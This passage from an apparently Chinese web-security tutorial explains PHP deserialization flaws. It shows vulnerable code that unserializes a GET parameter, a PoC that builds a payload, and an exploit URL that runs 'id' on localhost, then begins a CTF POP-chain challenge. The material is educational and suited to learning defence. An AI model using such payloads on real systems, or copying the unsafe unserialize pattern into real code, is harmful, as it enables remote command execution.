<span class="line"><span style="color:#005CC5;">__autoload</span><span style="color:#24292E;">()   </span><span style="color:#6A737D;">#尝试加载未定义的类</span></span>
<span class="line"><span style="color:#6F42C1;">__debugInfo</span><span style="color:#24292E;">()  </span><span style="color:#6A737D;">#打印所需调试信息</span></span></code></pre></div><p>下面通过一段漏洞代码来演示下魔术方法在反序列化漏洞中的利用，vul.php 漏洞代码如下：</p><div class="language-php vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">php</span><pre class="shiki github-dark vp-code-dark"><code><span class="line"><span style="color:#F97583;">&lt;?</span><span style="color:#79B8FF;">php</span></span>
<span class="line"><span style="color:#E1E4E8;">  </span><span style="color:#F97583;">class</span><span style="color:#E1E4E8;"> </span><span style="color:#B392F0;">People</span><span style="color:#E1E4E8;"> {</span></span>
<span class="line"><span style="color:#E1E4E8;">    </span><span style="color:#F97583;">private</span><span style="color:#E1E4E8;"> $type;</span></span>
<span class="line"></span>
<span class="line"><span style="color:#E1E4E8;">    </span><span style="color:#F97583;">function</span><span style="color:#E1E4E8;"> </span><span style="color:#79B8FF;">__construct</span><span style="color:#E1E4E8;">(){</span></span>
<span class="line"><span style="color:#E1E4E8;">      </span><span style="color:#79B8FF;">$this</span><span style="color:#F97583;">-&gt;</span><span style="color:#E1E4E8;">type </span><span style="color:#F97583;">=</span><span style="color:#E1E4E8;"> </span><span style="color:#F97583;">new</span><span style="color:#E1E4E8;"> </span><span style="color:#79B8FF;">Student</span><span style="color:#E1E4E8;">();</span></span>
<span class="line"><span style="color:#E1E4E8;">    }</span></span>
<span class="line"></span>
<span class="line"><span style="color:#E1E4E8;">    </span><span style="color:#F97583;">function</span><span style="color:#E1E4E8;"> </span><span style="color:#79B8FF;">__destruct</span><span style="color:#E1E4E8;">() {</span></span>
<span class="line"><span style="color:#E1E4E8;">      </span><span style="color:#79B8FF;">$this</span><span style="color:#F97583;">-&gt;</span><span style="color:#E1E4E8;">type</span><span style="color:#F97583;">-&gt;</span><span style="color:#B392F0;">run</span><span style="color:#E1E4E8;">();</span></span>
<span class="line"><span style="color:#E1E4E8;">    }</span></span>
<span class="line"><span style="color:#E1E4E8;">  }</span></span>
<span class="line"></span>
<span class="line"><span style="color:#E1E4E8;">  </span><span style="color:#F97583;">class</span><span style="color:#E1E4E8;"> </span><span style="color:#B392F0;">Student</span><span style="color:#E1E4E8;"> {</span></span>
<span class="line"><span style="color:#E1E4E8;">    </span><span style="color:#F97583;">function</span><span style="color:#E1E4E8;"> </span><span style="color:#B392F0;">run</span><span style="color:#E1E4E8;">() {</span></span>
<span class="line"><span style="color:#E1E4E8;">      </span><span style="color:#79B8FF;">echo</span><span style="color:#E1E4E8;"> </span><span style="color:#9ECBFF;">&quot;he is a student.&quot;</span><span style="color:#E1E4E8;">;</span></span>
<span class="line"><span style="color:#E1E4E8;">    }</span></span>
<span class="line"><span style="color:#E1E4E8;">  }</span></span>
<span class="line"></span>
<span class="line"><span style="color:#E1E4E8;">  </span><span style="color:#F97583;">class</span><span style="color:#E1E4E8;"> </span><span style="color:#B392F0;">Evil</span><span style="color:#E1E4E8;"> {</span></span>
<span class="line"><span style="color:#E1E4E8;">    </span><span style="color:#F97583;">var</span><span style="color:#E1E4E8;"> $cmd;</span></span>
<span class="line"><span style="color:#E1E4E8;">    </span><span style="color:#F97583;">function</span><span style="color:#E1E4E8;"> </span><span style="color:#B392F0;">run</span><span style="color:#E1E4E8;">() {</span></span>
<span class="line"><span style="color:#E1E4E8;">      </span><span style="color:#79B8FF;">system</span><span style="color:#E1E4E8;">(</span><span style="color:#79B8FF;">$this</span><span style="color:#F97583;">-&gt;</span><span style="color:#E1E4E8;">cmd);</span></span>
<span class="line"><span style="color:#E1E4E8;">    }</span></span>
<span class="line"><span style="color:#E1E4E8;">  }</span></span>
<span class="line"></span>
<span class="line"><span style="color:#E1E4E8;">  </span><span style="color:#79B8FF;">unserialize</span><span style="color:#E1E4E8;">($_GET[</span><span style="color:#9ECBFF;">&#39;str&#39;</span><span style="color:#E1E4E8;">]);  </span><span style="color:#6A737D;">// 漏洞触发点，引用外部可控参数作为反序列化数据</span></span>
<span class="line"><span style="color:#F97583;">?&gt;</span></span></code></pre><pre class="shiki github-light vp-code-light"><code><span class="line"><span style="color:#D73A49;">&lt;?</span><span style="color:#005CC5;">php</span></span>
<span class="line"><span style="color:#24292E;">  </span><span style="color:#D73A49;">class</span><span style="color:#24292E;"> </span><span style="color:#6F42C1;">People</span><span style="color:#24292E;"> {</span></span>
<span class="line"><span style="color:#24292E;">    </span><span style="color:#D73A49;">private</span><span style="color:#24292E;"> $type;</span></span>
<span class="line"></span>
<span class="line"><span style="color:#24292E;">    </span><span style="color:#D73A49;">function</span><span style="color:#24292E;"> </span><span style="color:#005CC5;">__construct</span><span style="color:#24292E;">(){</span></span>
<span class="line"><span style="color:#24292E;">      </span><span style="color:#005CC5;">$this</span><span style="color:#D73A49;">-&gt;</span><span style="color:#24292E;">type </span><span style="color:#D73A49;">=</span><span style="color:#24292E;"> </span><span style="color:#D73A49;">new</span><span style="color:#24292E;"> </span><span style="color:#005CC5;">Student</span><span style="color:#24292E;">();</span></span>
<span class="line"><span style="color:#24292E;">    }</span></span>
<span class="line"></span>
<span class="line"><span style="color:#24292E;">    </span><span style="color:#D73A49;">function</span><span style="color:#24292E;"> </span><span style="color:#005CC5;">__destruct</span><span style="color:#24292E;">() {</span></span>
<span class="line"><span style="color:#24292E;">      </span><span style="color:#005CC5;">$this</span><span style="color:#D73A49;">-&gt;</span><span style="color:#24292E;">type</span><span style="color:#D73A49;">-&gt;</span><span style="color:#6F42C1;">run</span><span style="color:#24292E;">();</span></span>
<span class="line"><span style="color:#24292E;">    }</span></span>
<span class="line"><span style="color:#24292E;">  }</span></span>
<span class="line"></span>
<span class="line"><span style="color:#24292E;">  </span><span style="color:#D73A49;">class</span><span style="color:#24292E;"> </span><span style="color:#6F42C1;">Student</span><span style="color:#24292E;"> {</span></span>
<span class="line"><span style="color:#24292E;">    </span><span style="color:#D73A49;">function</span><span style="color:#24292E;"> </span><span style="color:#6F42C1;">run</span><span style="color:#24292E;">() {</span></span>
<span class="line"><span style="color:#24292E;">      </span><span style="color:#005CC5;">echo</span><span style="color:#24292E;"> </span><span style="color:#032F62;">&quot;he is a student.&quot;</span><span style="color:#24292E;">;</span></span>
<span class="line"><span style="color:#24292E;">    }</span></span>
<span class="line"><span style="color:#24292E;">  }</span></span>
<span class="line"></span>
<span class="line"><span style="color:#24292E;">  </span><span style="color:#D73A49;">class</span><span style="color:#24292E;"> </span><span style="color:#6F42C1;">Evil</span><span style="color:#24292E;"> {</span></span>
<span class="line"><span style="color:#24292E;">    </span><span style="color:#D73A49;">var</span><span style="color:#24292E;"> $cmd;</span></span>
<span class="line"><span style="color:#24292E;">    </span><span style="color:#D73A49;">function</span><span style="color:#24292E;"> </span><span style="color:#6F42C1;">run</span><span style="color:#24292E;">() {</span></span>
<span class="line"><span style="color:#24292E;">      </span><span style="color:#005CC5;">system</span><span style="color:#24292E;">(</span><span style="color:#005CC5;">$this</span><span style="color:#D73A49;">-&gt;</span><span style="color:#24292E;">cmd);</span></span>
<span class="line"><span style="color:#24292E;">    }</span></span>
<span class="line"><span style="color:#24292E;">  }</span></span>
<span class="line"></span>
<span class="line"><span style="color:#24292E;">  </span><span style="color:#005CC5;">unserialize</span><span style="color:#24292E;">($_GET[</span><span style="color:#032F62;">&#39;str&#39;</span><span style="color:#24292E;">]);  </span><span style="color:#6A737D;">// 漏洞触发点，引用外部可控参数作为反序列化数据</span></span>
<span class="line"><span style="color:#D73A49;">?&gt;</span></span></code></pre></div><p>先分析下代码，$_GET[&#39;str&#39;] 获取 get 参数 str 值，然后传递给 unserialize 进行反序列化操作，这就是导致漏洞的地方。</p><p>那么我们该如何利用呢？审查整份代码，发现 Evil 类中的命令执行方法 run()，如果能控制其中的 $cmd 变量就可以实现远程命令执行。在 People 类的 __construct 方法中有属性赋值操作，将 Student 对象赋值给 $type 属性。</p><p>同时，在 __destruct 方法中有调用 run() 方法的操作，因此我们可以设法此这些操作关联起来，写出利用代码去生成用来实现命令执行的序列化字符串。</p><p>poc.php 利用代码如下：</p><div class="language-php vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">php</span><pre class="shiki github-dark vp-code-dark"><code><span class="line"><span style="color:#F97583;">&lt;?</span><span style="color:#79B8FF;">php</span></span>
<span class="line"><span style="color:#E1E4E8;">  </span><span style="color:#F97583;">class</span><span style="color:#E1E4E8;"> </span><span style="color:#B392F0;">People</span><span style="color:#E1E4E8;"> {</span></span>
<span class="line"><span style="color:#E1E4E8;">    </span><span style="color:#F97583;">private</span><span style="color:#E1E4E8;"> $type;</span></span>
<span class="line"></span>
<span class="line"><span style="color:#E1E4E8;">    </span><span style="color:#F97583;">function</span><span style="color:#E1E4E8;"> </span><span style="color:#79B8FF;">__construct</span><span style="color:#E1E4E8;">(){</span></span>
<span class="line"><span style="color:#E1E4E8;">      </span><span style="color:#79B8FF;">$this</span><span style="color:#F97583;">-&gt;</span><span style="color:#E1E4E8;">type </span><span style="color:#F97583;">=</span><span style="color:#E1E4E8;"> </span><span style="color:#F97583;">new</span><span style="color:#E1E4E8;"> </span><span style="color:#79B8FF;">Evil</span><span style="color:#E1E4E8;">();</span></span>
<span class="line"><span style="color:#E1E4E8;">    }</span></span>
<span class="line"><span style="color:#E1E4E8;">  }</span></span>
<span class="line"><span style="color:#E1E4E8;">  </span><span style="color:#F97583;">class</span><span style="color:#E1E4E8;"> </span><span style="color:#B392F0;">Evil</span><span style="color:#E1E4E8;"> {</span></span>
<span class="line"><span style="color:#E1E4E8;">    </span><span style="color:#F97583;">var</span><span style="color:#E1E4E8;"> $cmd </span><span style="color:#F97583;">=</span><span style="color:#E1E4E8;"> </span><span style="color:#9ECBFF;">&#39;id&#39;</span><span style="color:#E1E4E8;">;</span></span>
<span class="line"><span style="color:#E1E4E8;">  }</span></span>
<span class="line"><span style="color:#E1E4E8;">  $people </span><span style="color:#F97583;">=</span><span style="color:#E1E4E8;"> </span><span style="color:#F97583;">new</span><span style="color:#E1E4E8;"> </span><span style="color:#79B8FF;">People</span><span style="color:#E1E4E8;">();</span></span>
<span class="line"><span style="color:#E1E4E8;">  $str </span><span style="color:#F97583;">=</span><span style="color:#E1E4E8;"> </span><span style="color:#79B8FF;">serialize</span><span style="color:#E1E4E8;">($people);</span></span>
<span class="line"><span style="color:#E1E4E8;">  </span><span style="color:#79B8FF;">echo</span><span style="color:#E1E4E8;"> $str;</span></span>
<span class="line"><span style="color:#F97583;">?&gt;</span></span></code></pre><pre class="shiki github-light vp-code-light"><code><span class="line"><span style="color:#D73A49;">&lt;?</span><span style="color:#005CC5;">php</span></span>
<span class="line"><span style="color:#24292E;">  </span><span style="color:#D73A49;">class</span><span style="color:#24292E;"> </span><span style="color:#6F42C1;">People</span><span style="color:#24292E;"> {</span></span>
<span class="line"><span style="color:#24292E;">    </span><span style="color:#D73A49;">private</span><span style="color:#24292E;"> $type;</span></span>
<span class="line"></span>
<span class="line"><span style="color:#24292E;">    </span><span style="color:#D73A49;">function</span><span style="color:#24292E;"> </span><span style="color:#005CC5;">__construct</span><span style="color:#24292E;">(){</span></span>
<span class="line"><span style="color:#24292E;">      </span><span style="color:#005CC5;">$this</span><span style="color:#D73A49;">-&gt;</span><span style="color:#24292E;">type </span><span style="color:#D73A49;">=</span><span style="color:#24292E;"> </span><span style="color:#D73A49;">new</span><span style="color:#24292E;"> </span><span style="color:#005CC5;">Evil</span><span style="color:#24292E;">();</span></span>
<span class="line"><span style="color:#24292E;">    }</span></span>
<span class="line"><span style="color:#24292E;">  }</span></span>
<span class="line"><span style="color:#24292E;">  </span><span style="color:#D73A49;">class</span><span style="color:#24292E;"> </span><span style="color:#6F42C1;">Evil</span><span style="color:#24292E;"> {</span></span>
<span class="line"><span style="color:#24292E;">    </span><span style="color:#D73A49;">var</span><span style="color:#24292E;"> $cmd </span><span style="color:#D73A49;">=</span><span style="color:#24292E;"> </span><span style="color:#032F62;">&#39;id&#39;</span><span style="color:#24292E;">;</span></span>
<span class="line"><span style="color:#24292E;">  }</span></span>
<span class="line"><span style="color:#24292E;">  $people </span><span style="color:#D73A49;">=</span><span style="color:#24292E;"> </span><span style="color:#D73A49;">new</span><span style="color:#24292E;"> </span><span style="color:#005CC5;">People</span><span style="color:#24292E;">();</span></span>
<span class="line"><span style="color:#24292E;">  $str </span><span style="color:#D73A49;">=</span><span style="color:#24292E;"> </span><span style="color:#005CC5;">serialize</span><span style="color:#24292E;">($people);</span></span>
<span class="line"><span style="color:#24292E;">  </span><span style="color:#005CC5;">echo</span><span style="color:#24292E;"> $str;</span></span>
<span class="line"><span style="color:#D73A49;">?&gt;</span></span></code></pre></div><p>运行生成序列化字符串：</p><div class="language-java vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">java</span><pre class="shiki github-dark vp-code-dark"><code><span class="line"><span style="color:#E1E4E8;">$ php poc.php</span></span>
<span class="line"><span style="color:#E1E4E8;">O</span><span style="color:#F97583;">:</span><span style="color:#79B8FF;">6</span><span style="color:#F97583;">:</span><span style="color:#9ECBFF;">&quot;People&quot;</span><span style="color:#F97583;">:</span><span style="color:#79B8FF;">1</span><span style="color:#F97583;">:</span><span style="color:#E1E4E8;">{s</span><span style="color:#F97583;">:</span><span style="color:#79B8FF;">12</span><span style="color:#F97583;">:</span><span style="color:#9ECBFF;">&quot;Peopletype&quot;</span><span style="color:#E1E4E8;">;O</span><span style="color:#F97583;">:</span><span style="color:#79B8FF;">4</span><span style="color:#F97583;">:</span><span style="color:#9ECBFF;">&quot;Evil&quot;</span><span style="color:#F97583;">:</span><span style="color:#79B8FF;">1</span><span style="color:#F97583;">:</span><span style="color:#E1E4E8;">{s</span><span style="color:#F97583;">:</span><span style="color:#79B8FF;">3</span><span style="color:#F97583;">:</span><span style="color:#9ECBFF;">&quot;cmd&quot;</span><span style="color:#E1E4E8;">;s</span><span style="color:#F97583;">:</span><span style="color:#79B8FF;">2</span><span style="color:#F97583;">:</span><span style="color:#9ECBFF;">&quot;id&quot;</span><span style="color:#E1E4E8;">;}}</span></span></code></pre><pre class="shiki github-light vp-code-light"><code><span class="line"><span style="color:#24292E;">$ php poc.php</span></span>
<span class="line"><span style="color:#24292E;">O</span><span style="color:#D73A49;">:</span><span style="color:#005CC5;">6</span><span style="color:#D73A49;">:</span><span style="color:#032F62;">&quot;People&quot;</span><span style="color:#D73A49;">:</span><span style="color:#005CC5;">1</span><span style="color:#D73A49;">:</span><span style="color:#24292E;">{s</span><span style="color:#D73A49;">:</span><span style="color:#005CC5;">12</span><span style="color:#D73A49;">:</span><span style="color:#032F62;">&quot;Peopletype&quot;</span><span style="color:#24292E;">;O</span><span style="color:#D73A49;">:</span><span style="color:#005CC5;">4</span><span style="color:#D73A49;">:</span><span style="color:#032F62;">&quot;Evil&quot;</span><span style="color:#D73A49;">:</span><span style="color:#005CC5;">1</span><span style="color:#D73A49;">:</span><span style="color:#24292E;">{s</span><span style="color:#D73A49;">:</span><span style="color:#005CC5;">3</span><span style="color:#D73A49;">:</span><span style="color:#032F62;">&quot;cmd&quot;</span><span style="color:#24292E;">;s</span><span style="color:#D73A49;">:</span><span style="color:#005CC5;">2</span><span style="color:#D73A49;">:</span><span style="color:#032F62;">&quot;id&quot;</span><span style="color:#24292E;">;}}</span></span></code></pre></div><p>里面的 &quot;Peopletype&quot; 又被吃掉 \\x00 了，得补回去，然后将上述字符串作为 get 参数 $str 的值发送给 vul.php：</p><div class="language-java vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">java</span><pre class="shiki github-dark vp-code-dark"><code><span class="line"><span style="color:#E1E4E8;">http</span><span style="color:#F97583;">:</span><span style="color:#6A737D;">//127.0.0.1/vul.php?str=O:6:%22People%22:1:{s:12:%22%00People%00type%22;O:4:%22Evil%22:1:{s:3:%22cmd%22;s:2:%22id%22;}}</span></span></code></pre><pre class="shiki github-light vp-code-light"><code><span class="line"><span style="color:#24292E;">http</span><span style="color:#D73A49;">:</span><span style="color:#6A737D;">//127.0.0.1/vul.php?str=O:6:%22People%22:1:{s:12:%22%00People%00type%22;O:4:%22Evil%22:1:{s:3:%22cmd%22;s:2:%22id%22;}}</span></span></code></pre></div>`,49),E=l(`<p>图 1 成功利用反序列化漏洞执行任意命令</p><p>总结下利用思路：</p><ol><li><p>寻找原程序中可利用的目标方法，比如包含 system、eval、exec 等危险函数的地方，正如示例中的 Evil 类；</p></li><li><p>追踪调用第 1 步中方法的其他类方法/函数，正如示例中 People 类方法 __destruct()；</p></li><li><p>寻找可控制第 1 步方法的参数的其他类方法函数，正如示例中 People 类方法 __construct()；</p></li><li><p>编写 poc，构建恶意类对象，然后调用 serialize 函数去生成序列化字符串；</p></li><li><p>将生成的序列化字符串传递给漏洞参数实现利用。</p></li></ol><h4 id="_2-pop-链构造" tabindex="-1">2.POP 链构造 <a class="header-anchor" href="#_2-pop-链构造" aria-label="Permalink to &quot;2.POP 链构造&quot;">​</a></h4><p>面向属性编程（Property-Oriented Programing，POP）利用现有执行环境中原有的代码序列（比如原程序中已定义或者可动态加载的对象属性、方法），将这些调用组合在一起形式特定的调用链，以达到特定目的的方法。这与二进制漏洞利用中的 ROP（Return-Oriented Progaming，面向返回编程）的原理是相似的。</p><p>其实前面利用魔术方法构建调用链的方法就算是 POP 链，只是比较简单，在真实的漏洞环境中，会复杂很多。</p><p>我从网上找了一道 CTF 题，以帮助你更好地理解构建 POP 链的思路。</p><p>题目代码如下，代码中有 3 个类，Output 类有构造方法 construct 和析构方法 destruct，Show 类中有一些设置属性值的方法，Test 类中则含有读取文件的方法，最后使用 GET 参数传入 unserialize() 函数导致反序列化漏洞。</p><div class="language-php vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">php</span><pre class="shiki github-dark vp-code-dark"><code><span class="line"><span style="color:#F97583;">&lt;?</span><span style="color:#79B8FF;">php</span></span>
<span class="line"><span style="color:#F97583;">class</span><span style="color:#E1E4E8;"> </span><span style="color:#B392F0;">Output</span><span style="color:#E1E4E8;">{</span></span>
<span class="line"><span style="color:#E1E4E8;">    </span><span style="color:#F97583;">public</span><span style="color:#E1E4E8;"> $test;</span></span>
<span class="line"><span style="color:#E1E4E8;">    </span><span style="color:#F97583;">public</span><span style="color:#E1E4E8;"> $str;</span></span>
<span class="line"><span style="color:#E1E4E8;">    </span><span style="color:#F97583;">public</span><span style="color:#E1E4E8;"> </span><span style="color:#F97583;">function</span><span style="color:#E1E4E8;"> </span><span style="color:#79B8FF;">__construct</span><span style="color:#E1E4E8;">($name){</span></span>
<span class="line"><span style="color:#E1E4E8;">        </span><span style="color:#79B8FF;">$this</span><span style="color:#F97583;">-&gt;</span><span style="color:#E1E4E8;">str </span><span style="color:#F97583;">=</span><span style="color:#E1E4E8;"> $name;</span></span>
<span class="line"><span style="color:#E1E4E8;">    }</span></span>
<span class="line"><span style="color:#E1E4E8;">    </span><span style="color:#F97583;">public</span><span style="color:#E1E4E8;"> </span><span style="color:#F97583;">function</span><span style="color:#E1E4E8;"> </span><span style="color:#79B8FF;">__destruct</span><span style="color:#E1E4E8;">(){</span></span>
<span class="line"><span style="color:#E1E4E8;">        </span><span style="color:#79B8FF;">$this</span><span style="color:#F97583;">-&gt;</span><span style="color:#E1E4E8;">test </span><span style="color:#F97583;">=</span><span style="color:#E1E4E8;"> </span><span style="color:#79B8FF;">$this</span><span style="color:#F97583;">-&gt;</span><span style="color:#E1E4E8;">str;</span></span>
<span class="line"><span style="color:#E1E4E8;">        </span><span style="color:#79B8FF;">echo</span><span style="color:#E1E4E8;"> </span><span style="color:#79B8FF;">$this</span><span style="color:#F97583;">-&gt;</span><span style="color:#E1E4E8;">test;</span></span>
<span class="line"><span style="color:#E1E4E8;">    }</span></span>
<span class="line"><span style="color:#E1E4E8;">}</span></span>
<span class="line"><span style="color:#F97583;">class</span><span style="color:#E1E4E8;"> </span><span style="color:#B392F0;">Show</span><span style="color:#E1E4E8;">{</span></span>
<span class="line"><span style="color:#E1E4E8;">    </span><span style="color:#F97583;">public</span><span style="color:#E1E4E8;"> $source;</span></span>
<span class="line"><span style="color:#E1E4E8;">    </span><span style="color:#F97583;">public</span><span style="color:#E1E4E8;"> $str;</span></span>
<span class="line"><span style="color:#E1E4E8;">    </span><span style="color:#F97583;">public</span><span style="color:#E1E4E8;"> </span><span style="color:#F97583;">function</span><span style="color:#E1E4E8;"> </span><span style="color:#79B8FF;">__construct</span><span style="color:#E1E4E8;">($file){</span></span>
<span class="line"><span style="color:#E1E4E8;">        </span><span style="color:#79B8FF;">$this</span><span style="color:#F97583;">-&gt;</span><span style="color:#E1E4E8;">source </span><span style="color:#F97583;">=</span><span style="color:#E1E4E8;"> $file;</span></span>
<span class="line"><span style="color:#E1E4E8;">        </span><span style="color:#79B8FF;">echo</span><span style="color:#E1E4E8;"> </span><span style="color:#79B8FF;">$this</span><span style="color:#F97583;">-&gt;</span><span style="color:#E1E4E8;">source;</span></span>
<span class="line"><span style="color:#E1E4E8;">    }</span></span>
<span class="line"><span style="color:#E1E4E8;">    </span><span style="color:#F97583;">public</span><span style="color:#E1E4E8;"> </span><span style="color:#F97583;">function</span><span style="color:#E1E4E8;"> </span><span style="color:#79B8FF;">__toString</span><span style="color:#E1E4E8;">(){</span></span>
<span class="line"><span style="color:#E1E4E8;">        $content </span><span style="color:#F97583;">=</span><span style="color:#E1E4E8;"> </span><span style="color:#79B8FF;">$this</span><span style="color:#F97583;">-&gt;</span><span style="color:#E1E4E8;">str[</span><span style="color:#9ECBFF;">&#39;str&#39;</span><span style="color:#E1E4E8;">]</span><span style="color:#F97583;">-&gt;</span><span style="color:#E1E4E8;">source;</span></span>
<span class="line"><span style="color:#E1E4E8;">        </span><span style="color:#F97583;">return</span><span style="color:#E1E4E8;"> $content;</span></span>
<span class="line"><span style="color:#E1E4E8;">    }</span></span>
<span class="line"><span style="color:#E1E4E8;">    </span><span style="color:#F97583;">public</span><span style="color:#E1E4E8;"> </span><span style="color:#F97583;">function</span><span style="color:#E1E4E8;"> </span><span style="color:#79B8FF;">__set</span><span style="color:#E1E4E8;">($key,$value){</span></span>
<span class="line"><span style="color:#E1E4E8;">        </span><span style="color:#79B8FF;">$this</span><span style="color:#F97583;">-&gt;</span><span style="color:#E1E4E8;">$key </span><span style="color:#F97583;">=</span><span style="color:#E1E4E8;"> $value;</span></span>
<span class="line"><span style="color:#E1E4E8;">    }</span></span>
<span class="line"><span style="color:#E1E4E8;">    </span><span style="color:#F97583;">public</span><span style="color:#E1E4E8;"> </span><span style="color:#F97583;">function</span><span style="color:#E1E4E8;"> </span><span style="color:#B392F0;">_show</span><span style="color:#E1E4E8;">(){</span></span>
<span class="line"><span style="color:#E1E4E8;">        </span><span style="color:#F97583;">if</span><span style="color:#E1E4E8;">(</span><span style="color:#79B8FF;">preg_match</span><span style="color:#E1E4E8;">(</span><span style="color:#9ECBFF;">&#39;/</span><span style="color:#DBEDFF;">http|https|file:|gopher|dict|</span><span style="color:#85E89D;font-weight:bold;">\\.\\.</span><span style="color:#DBEDFF;">|f1ag</span><span style="color:#9ECBFF;">/i&#39;</span><span style="color:#E1E4E8;">,</span><span style="color:#79B8FF;">$this</span><span style="color:#F97583;">-&gt;</span><span style="color:#E1E4E8;">source)){</span></span>
<span class="line"><span style="color:#E1E4E8;">            </span><span style="color:#F97583;">die</span><span style="color:#E1E4E8;">(</span><span style="color:#9ECBFF;">&#39;hacker!&#39;</span><span style="color:#E1E4E8;">);</span></span>
<span class="line"><span style="color:#E1E4E8;">        } </span><span style="color:#F97583;">else</span><span style="color:#E1E4E8;"> {</span></span>
<span class="line"><span style="color:#E1E4E8;">            </span><span style="color:#79B8FF;">highlight_file</span><span style="color:#E1E4E8;">(</span><span style="color:#79B8FF;">$this</span><span style="color:#F97583;">-&gt;</span><span style="color:#E1E4E8;">source);</span></span>
<span class="line"><span style="color:#E1E4E8;">        }</span></span>
<span class="line"><span style="color:#E1E4E8;">    }</span></span>
<span class="line"><span style="color:#E1E4E8;">    </span><span style="color:#F97583;">public</span><span style="color:#E1E4E8;"> </span><span style="color:#F97583;">function</span><span style="color:#E1E4E8;"> </span><span style="color:#79B8FF;">__wakeup</span><span style="color:#E1E4E8;">(){</span></span>
<span class="line"><span style="color:#E1E4E8;">        </span><span style="color:#F97583;">if</span><span style="color:#E1E4E8;">(</span><span style="color:#79B8FF;">preg_match</span><span style="color:#E1E4E8;">(</span><span style="color:#9ECBFF;">&quot;/</span><span style="color:#DBEDFF;">http|https|file:|gopher|dict|</span><span style="color:#85E89D;font-weight:bold;">\\.\\.</span><span style="color:#9ECBFF;">/i&quot;</span><span style="color:#E1E4E8;">, </span><span style="color:#79B8FF;">$this</span><span style="color:#F97583;">-&gt;</span><span style="color:#E1E4E8;">source)){</span></span>
<span class="line"><span style="color:#E1E4E8;">            </span><span style="color:#79B8FF;">echo</span><span style="color:#E1E4E8;"> </span><span style="color:#9ECBFF;">&quot;hacker~&quot;</span><span style="color:#E1E4E8;">;</span></span>
<span class="line"><span style="color:#E1E4E8;">            </span><span style="color:#79B8FF;">$this</span><span style="color:#F97583;">-&gt;</span><span style="color:#E1E4E8;">source </span><span style="color:#F97583;">=</span><span style="color:#E1E4E8;"> </span><span style="color:#9ECBFF;">&quot;index.php&quot;</span><span style="color:#E1E4E8;">;</span></span>
<span class="line"><span style="color:#E1E4E8;">        }</span></span>
<span class="line"><span style="color:#E1E4E8;">    }</span></span>
<span class="line"><span style="color:#E1E4E8;">}</span></span>
<span class="line"><span style="color:#F97583;">class</span><span style="color:#E1E4E8;"> </span><span style="color:#B392F0;">Test</span><span style="color:#E1E4E8;">{</span></span>
<span class="line"><span style="color:#E1E4E8;">    </span><span style="color:#F97583;">public</span><span style="color:#E1E4E8;"> $file;</span></span>
<span class="line"><span style="color:#E1E4E8;">    </span><span style="color:#F97583;">public</span><span style="color:#E1E4E8;"> $params;</span></span>
<span class="line"><span style="color:#E1E4E8;">    </span><span style="color:#F97583;">public</span><span style="color:#E1E4E8;"> </span><span style="color:#F97583;">function</span><span style="color:#E1E4E8;"> </span><span style="color:#79B8FF;">__construct</span><span style="color:#E1E4E8;">(){</span></span>
<span class="line"><span style="color:#E1E4E8;">        </span><span style="color:#79B8FF;">$this</span><span style="color:#F97583;">-&gt;</span><span style="color:#E1E4E8;">params </span><span style="color:#F97583;">=</span><span style="color:#E1E4E8;"> </span><span style="color:#79B8FF;">array</span><span style="color:#E1E4E8;">();</span></span>
<span class="line"><span style="color:#E1E4E8;">    }</span></span>
<span class="line"><span style="color:#E1E4E8;">    </span><span style="color:#F97583;">public</span><span style="color:#E1E4E8;"> </span><span style="color:#F97583;">function</span><span style="color:#E1E4E8;"> </span><span style="color:#79B8FF;">__get</span><span style="color:#E1E4E8;">($key){</span></span>
<span class="line"><span style="color:#E1E4E8;">        </span><span style="color:#F97583;">return</span><span style="color:#E1E4E8;"> </span><span style="color:#79B8FF;">$this</span><span style="color:#F97583;">-&gt;</span><span style="color:#B392F0;">get</span><span style="color:#E1E4E8;">($key);</span></span>
<span class="line"><span style="color:#E1E4E8;">    }</span></span>
<span class="line"><span style="color:#E1E4E8;">    </span><span style="color:#F97583;">public</span><span style="color:#E1E4E8;"> </span><span style="color:#F97583;">function</span><span style="color:#E1E4E8;"> </span><span style="color:#B392F0;">get</span><span style="color:#E1E4E8;">($key){</span></span>
<span class="line"><span style="color:#E1E4E8;">        </span><span style="color:#F97583;">if</span><span style="color:#E1E4E8;">(</span><span style="color:#79B8FF;">isset</span><span style="color:#E1E4E8;">(</span><span style="color:#79B8FF;">$this</span><span style="color:#F97583;">-&gt;</span><span style="color:#E1E4E8;">params[$key])){</span></span>
<span class="line"><span style="color:#E1E4E8;">            $value </span><span style="color:#F97583;">=</span><span style="color:#E1E4E8;"> </span><span style="color:#79B8FF;">$this</span><span style="color:#F97583;">-&gt;</span><span style="color:#E1E4E8;">params[$key];</span></span>
<span class="line"><span style="color:#E1E4E8;">        } </span><span style="color:#F97583;">else</span><span style="color:#E1E4E8;"> {</span></span>
<span class="line"><span style="color:#E1E4E8;">            $value </span><span style="color:#F97583;">=</span><span style="color:#E1E4E8;"> </span><span style="color:#9ECBFF;">&quot;index.php&quot;</span><span style="color:#E1E4E8;">;</span></span>
<span class="line"><span style="color:#E1E4E8;">        }</span></span>
<span class="line"><span style="color:#E1E4E8;">        </span><span style="color:#F97583;">return</span><span style="color:#E1E4E8;"> </span><span style="color:#79B8FF;">$this</span><span style="color:#F97583;">-&gt;</span><span style="color:#B392F0;">file_get</span><span style="color:#E1E4E8;">($value);</span></span>
<span class="line"><span style="color:#E1E4E8;">    }</span></span>
<span class="line"><span style="color:#E1E4E8;">    </span><span style="color:#F97583;">public</span><span style="color:#E1E4E8;"> </span><span style="color:#F97583;">function</span><span style="color:#E1E4E8;"> </span><span style="color:#B392F0;">file_get</span><span style="color:#E1E4E8;">($value){</span></span>
<span class="line"><span style="color:#E1E4E8;">        $text </span><span style="color:#F97583;">=</span><span style="color:#E1E4E8;"> </span><span style="color:#79B8FF;">base64_encode</span><span style="color:#E1E4E8;">(</span><span style="color:#79B8FF;">file_get_contents</span><span style="color:#E1E4E8;">($value));</span></span>
<span class="line"><span style="color:#E1E4E8;">        </span><span style="color:#F97583;">return</span><span style="color:#E1E4E8;"> $text;</span></span>
<span class="line"><span style="color:#E1E4E8;">    }</span></span>
<span class="line"><span style="color:#E1E4E8;">}</span></span>
<span class="line"><span style="color:#79B8FF;">show_source</span><span style="color:#E1E4E8;">(</span><span style="color:#79B8FF;">__FILE__</span><span style="color:#E1E4E8;">);</span></span>
